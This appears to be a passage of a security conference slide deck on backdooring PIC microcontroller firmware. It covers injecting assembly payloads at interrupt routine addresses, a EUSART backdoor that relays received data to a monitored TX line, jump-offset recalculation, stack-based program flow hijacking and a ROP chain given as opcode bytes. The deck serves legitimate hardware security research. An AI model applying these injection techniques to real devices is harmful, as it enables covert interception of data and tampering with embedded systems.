•
CCP (Capture/Compare/PWM)
•
TX/RX busses
•
Others
@UnaPibaGeek
GIE AND PEIE BITS_
@UnaPibaGeek
GIE AND PEIE BITS_
BSF
INTCON, GIE
// Set GIE to 1 
BSF
INTCON, PEIE 
// Set PEIE to 1
@UnaPibaGeek
GIE AND PEIE BITS_
BSF
INTCON, GIE
// Set GIE to 1 
BSF
INTCON, PEIE 
// Set PEIE to 1
Interruptions enabled
@UnaPibaGeek
INTERRUPTION FLAGS_
Timer0
Interruption Enabled
Timer0
Interruption Flag
@UnaPibaGeek
INTERRUPTION FLAGS_
Timer0
Interruption Enabled
Timer0
Interruption Flag
XXIE = Interruption Enabled
XXIF = Interruption Flag
@UnaPibaGeek
INTERRUPTION FLAGS_
Timer0
Interruption Enabled
Timer0
Interruption Flag
XXIE = Interruption Enabled
XXIF = Interruption Flag
Registers PIE1, PIE2 and PIE3 have interruption enabling bits
Registers PIR1, PIR2 and PIR3 have interruption flags bits
@UnaPibaGeek
POLLING INSPECTION_
@UnaPibaGeek
POLLING INSPECTION_
Interrupt vector
Polling
@UnaPibaGeek
POLLING INSPECTION_
PIR1, 5
@UnaPibaGeek
POLLING INSPECTION_
PIR1, 5
PIR1, 5 = PIR1, RCIF
@UnaPibaGeek
POLLING INSPECTION_
PIR1, 5
PIR1, 5 = PIR1, RCIF
Call to RC interruption routine
@UnaPibaGeek
MEMORY ADDRESSES TO INJECT A PAYLOAD_
0x48 to inject a payload at the RC interruption
0x4E to inject a payload at Timer0 interruption
0x56 to inject a payload at the AD interruption
0x5E to inject a payload at the INT0 interruption
@UnaPibaGeek
BACKDOORING THE EUSART COMMUNICATION
PERIPHERAL_
Step 1: locate where the RC interruption routine begins (by inspecting the polling)
Call to RC interruption routine
@UnaPibaGeek
BACKDOORING THE EUSART COMMUNICATION
PERIPHERAL_
Step 1: locate where the RC interruption routine begins (by inspecting the polling)
Call to RC interruption routine
0x48 
RC interruption routine begins
@UnaPibaGeek
BACKDOORING THE EUSART COMMUNICATION
PERIPHERAL_
Step 2: Cook a payload that makes a relaying of the received data to a TX
peripheral which we are able to monitor externally (example)
MOVF       RCREG, W 
// Move the received data to “W” register 
BSF           TXSTA, TXEN 
// Enable transmission
BCF           TXSTA, SYNC 
// Set asynchronous operation
BSF           RCSTA, SPEN 
// Set TX/CK pin as an output
MOVWF   TXREG 
// Move received data (in W) to TXREG to be re-transmitted
@UnaPibaGeek
BACKDOORING THE EUSART COMMUNICATION
PERIPHERAL_
Step 2: Cook a payload that makes a relaying of the received data to a TX
peripheral which we are able to monitor externally (example)
MOVF       RCREG, W 
// Move the received data to “W” register 
BSF           TXSTA, TXEN 
// Enable transmission
BCF           TXSTA, SYNC 
// Set asynchronous operation
BSF           RCSTA, SPEN 
// Set TX/CK pin as an output
MOVWF   TXREG 
// Move received data (in W) to TXREG to be re-transmitted
0xAE50 0xAC8A 0xAC98 0xAB8E 0xAD6E
@UnaPibaGeek
BACKDOORING THE EUSART COMMUNICATION
PERIPHERAL_
Step 3: lnject the payload where the RC interruption routine begins 
0x48 
RC interruption routine begins
Backdoor
@UnaPibaGeek
BACKDOORING THE EUSART COMMUNICATION
PERIPHERAL_
Step 3: lnject the payload where the RC interruption routine begins 
0x48 
RC interruption routine begins
Backdoor
@UnaPibaGeek
FIXING JUMPS: FLOW CORRUPTION_
Original program
Program after
payload injection
@UnaPibaGeek
FIXING JUMPS: GOTO AND CALL OPCODES_
GOTO opcode = 0xEF
CALL opcode = 0xEC
NOP opcode = 0xF0
@UnaPibaGeek
FIXING JUMPS: GOTO AND CALL OPCODES_
GOTO opcode = 0xEF
CALL opcode = 0xEC
NOP opcode = 0xF0
EF06 F000 = GOTO jumping to 0x0006 offset (0x000C memory address).
EC67 F004 = CALL jumping to 0x0467 offset (0x08CE memory address).
@UnaPibaGeek
FIXING JUMPS: GOTO AND CALL OPCODES_
GOTO opcode = 0xEF
CALL opcode = 0xEC
NOP opcode = 0xF0
EF06 F000 = GOTO jumping to 0x0006 offset (0x000C memory address).
EC67 F004 = CALL jumping to 0x0467 offset (0x08CE memory address).
Jump to 0x8CE (memory address) / 2 = 0x0467 offset 
@UnaPibaGeek
FIXING JUMPS: RECALCULATION_
Payload injected at memory address: 0x48
Payload length: 10 bytes
@UnaPibaGeek
FIXING JUMPS: RECALCULATION_
Payload injected at memory address: 0x48
Payload length: 10 bytes
Example: 
CALL 0x56 (EC2B F000)
CALL 0x60 (EC30 F000)
Fixed jump
Original offset + payload length
Original jump
@UnaPibaGeek
FIXING JUMPS: RECALCULATION_
Payload injected at memory address: 0x48
Payload length: 10 bytes
Example: 
CALL 0x56 (EC2B F000)
CALL 0x60 (EC30 F000)
Fixed jump
Original offset + payload length
Original jump
Three CALL fixed after injection
@UnaPibaGeek
AUTOMATING PAYLOAD INJECTION_
https://github.com/UnaPibaGeek/UCPI 
@UnaPibaGeek
STACK 
PAYLOAD INJECTION: 
CONTROLLING PROGRAM FLOW_
@UnaPibaGeek
STKPTR, TOSU, TOSH AND TOSL_
STKPTR = Stack Pointer register
TOSU, TOSH and TOSL = Top of Stack registers
@UnaPibaGeek
PROGRAM FLOW CONTROL_
INCF STKPTR,F 
// SP increment 
MOVLW 0x00 
MOVWF TOSU
// TOSU = 0x00
MOVLW 0x0C 
MOVWF TOSH
// TOSH = 0x0C
MOVLW 0x72 
MOVWF TOSL
// TOSL = 0x72 
RETURN
Jump to 0x000C72
@UnaPibaGeek
PROGRAM FLOW CONTROL_
INCF STKPTR,F 
// SP increment 
MOVLW 0x00 
MOVWF TOSU
// TOSU = 0x00
MOVLW 0x0C 
MOVWF TOSH
// TOSH = 0x0C
MOVLW 0x72 
MOVWF TOSL
// TOSL = 0x72 
RETURN
Jump to 0x000C72
SP Increment
TOS = 0x000024 
Jump to 0x000024
@UnaPibaGeek
PROGRAM FLOW CONTROL_
INCF STKPTR,F 
// SP increment 
MOVLW 0x00 
MOVWF TOSU
// TOSU = 0x00
MOVLW 0x0C 
MOVWF TOSH
// TOSH = 0x0C
MOVLW 0x72 
MOVWF TOSL
// TOSL = 0x72 
RETURN
Jump to 0x000C72
SP Increment
TOS = 0x000024 
Jump to 0x000024
@UnaPibaGeek
PROGRAM FLOW CONTROL_
INCF STKPTR,F 
// SP increment 
MOVLW 0x00 
MOVWF TOSU
// TOSU = 0x00
MOVLW 0x0C 
MOVWF TOSH
// TOSH = 0x0C
MOVLW 0x72 
MOVWF TOSL
// TOSL = 0x72 
RETURN
Jump to 0x000C72
SP Increment
TOS = 0x000024 
Jump to 0x000024
@UnaPibaGeek
ROP-CHAIN_
ROP gadgets:
0x0060 =  0xFC2A000EFF6E000EFE6E600EFD6E 
0x0058 =  0xFC2A000EFF6E000EFE6E580EFD6E
0x0050 =  0xFC2A000EFF6E000EFE6E500EFD6E
0x0048 =  0xFC2A000EFF6E000EFE6E480EFD6E
0x0040 =  0xFC2A000EFF6E000EFE6E400EFD6E
0x0038 =  0xFC2A000EFF6E000EFE6E380EFD6E
0x0030 =  0xFC2A000EFF6E000EFE6E300EFD6E
0x0028 =  0xFC2A000EFF6E000EFE6E280EFD6E
RET = 0x1200
(last)
(first)
@UnaPibaGeek
ROP-CHAIN_
ROP gadgets:
0x0060 =  0xFC2A000EFF6E000EFE6E600EFD6E 
0x0058 =  0xFC2A000EFF6E000EFE6E580EFD6E
0x0050 =  0xFC2A000EFF6E000EFE6E500EFD6E
0x0048 =  0xFC2A000EFF6E000EFE6E480EFD6E
0x0040 =  0xFC2A000EFF6E000EFE6E400EFD6E
0x0038 =  0xFC2A000EFF6E000EFE6E380EFD6E
0x0030 =  0xFC2A000EFF6E000EFE6E300EFD6E
0x0028 =  0xFC2A000EFF6E000EFE6E280EFD6E
RET = 0x1200
(last)
(first)
Gadget example at 0x0040:
RETURN or RETLW
@UnaPibaGeek
ROP-CHAIN_
ROP gadgets:
0x0060 =  0xFC2A000EFF6E000EFE6E600EFD6E 
0x0058 =  0xFC2A000EFF6E000EFE6E580EFD6E
0x0050 =  0xFC2A000EFF6E000EFE6E500EFD6E
0x0048 =  0xFC2A000EFF6E000EFE6E480EFD6E
0x0040 =  0xFC2A000EFF6E000EFE6E400EFD6E
0x0038 =  0xFC2A000EFF6E000EFE6E380EFD6E
0x0030 =  0xFC2A000EFF6E000EFE6E300EFD6E
0x0028 =  0xFC2A000EFF6E000EFE6E280EFD6E
RET = 0x1200
(last)
(first)
Gadget example at 0x0040:
RETURN or RETLW
@UnaPibaGeek
PROGRAM MEMORY
PROTECTIONS_
@UnaPibaGeek
CODE PROTECTION_
Microchip Config Directives
Program memory dump still works
@UnaPibaGeek
BOOT AND DATA PROTECTION_
Microchip Config Directives
Program memory dump doesn’t work
@UnaPibaGeek
CONCLUSIONS_
@UnaPibaGeek
SPECIAL THANKS_
Sol (@encodedwitch)
Nico Waisman (@nicowaisman)
Dreamlab Technologies
THANK YOU_
SHEILA A. BERTA (@UNAPIBAGEEK)